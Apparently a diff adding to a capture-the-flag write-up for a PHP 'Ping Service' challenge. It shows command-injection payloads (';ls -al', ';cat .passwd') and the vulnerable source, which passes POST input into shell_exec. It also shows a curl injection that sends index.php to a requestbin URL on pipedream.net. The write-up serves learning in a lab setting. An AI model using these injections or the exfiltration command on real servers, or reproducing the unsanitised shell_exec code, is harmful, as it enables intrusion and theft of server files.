@@ -8,3 +8,30 @@ We only need to insert in text box with ';'. This keyword will hold the process 
 Exploit commands :
 ;ls -al #This will show listed all files in this directory and its permissins. You'll found '.passwd' file on this directory.
 ;cat .passwd #Now, will can see the FLAG of this challenge.
+
+Code details of 'index.php' from server :
+<html>
+<head>
+<title>Ping Service</title>
+</head>
+<body>
+<form method="POST" action="index.php">
+        <input type="text" name="ip" placeholder="127.0.0.1">
+        <input type="submit">
+</form>
+<pre>
+<?php 
+$flag = "".file_get_contents(".passwd")."";
+if(isset($_POST["ip"]) && !empty($_POST["ip"])){
+        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
+        echo $response;
+}
+?>
+</pre>
+</body>
+</html>
+
+How can i get these code? :
+
+Register : https://pipedream.com/
+Command : ; curl --data-urlencode "content@index.php" https://*****.m.pipedream.net # Server will sent code to u via requestbin
